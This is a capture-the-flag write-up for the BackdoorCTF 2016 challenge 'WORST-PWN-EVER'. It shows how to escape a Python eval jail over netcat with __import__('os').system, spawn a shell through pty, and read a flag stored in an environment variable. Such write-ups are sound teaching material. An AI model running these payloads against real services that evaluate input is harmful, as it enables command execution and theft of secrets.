Author: michals (Michał Soczewka)

WORST-PWN-EVER
==============

CTF: BackdoorCTF 2016  
Link: https://backdoor.sdslabs.co/challenges/WORST-PWN-EVER  
Author: Ashish Chaudhary  
Points: 100  
Category: pwn, Python


Description
-----------

>   tocttou is an enviornmentalist. But some say he has a vicious motive
>   and he uses nature to hide his dark side. We found a weird shell on
>   his amazon (pun inteded) web services. Can you tell us what is he
>   upto?
>
>   Tip: he might shut down the machine if he notices you - and he will
>   (maybe in 45 seconds).
>
>   Access: nc hack.bckdr.in 9008


## TL;DR
We have been given an Python eval jail over a TCP socket.
The solution is to retreive an environment variable using one
of the classic builtin hacks, for example:
```python
__import__('os').system('env|grep -iE ".*f.*l.*a.*g"')
```

## Solution
After establishing a connection to the given server a prompt is returned.
Let's try some random fuzzing...
First let's see what happens when we press `CTRL+D`
right away:

```
> EOFError: EOF when reading a line
--> WHAT ARE YOU DOING HERE? >-[
```
Let's check if it is a system shell:
```
> echo x
SyntaxError: unexpected EOF while parsing (<string>, line 1)
--> WHAT ARE YOU DOING HERE? >-[
```
No, it's definitely not a system shell. It looks like a Python interpreter.
Let's check this theory then:
```
> 1+1
```
No response, no error - it looks promising.
Let's check then if we can see some Python errors:
```
> 1+'x'*[]
TypeError: can't multiply sequence by non-int of type 'list'
```
Bingo! If it really is an old `eval` jail, then
we could escape using a classic builtin hacks.
Let's check that:
```
> str(__import__('os').system('echo x'))
x
```
 Got it! Let's get a shell and start looking around:
```
> __import__('pty').spawn('/bin/sh')
sh-4.3#
```

After looking through available files for a few minutes
and finding nothing useful, we noticed the task description
contains a clue - the word *environmentalist*
suggests checking environment variables.

```
sh-4.3# env
HOSTNAME=43523caef67d
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_F_L_A_G_='xxxxxxxxxxxxxxx CENSORED xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
PWD=/scripts
SHLVL=3
HOME=/root
_=/usr/bin/env
```
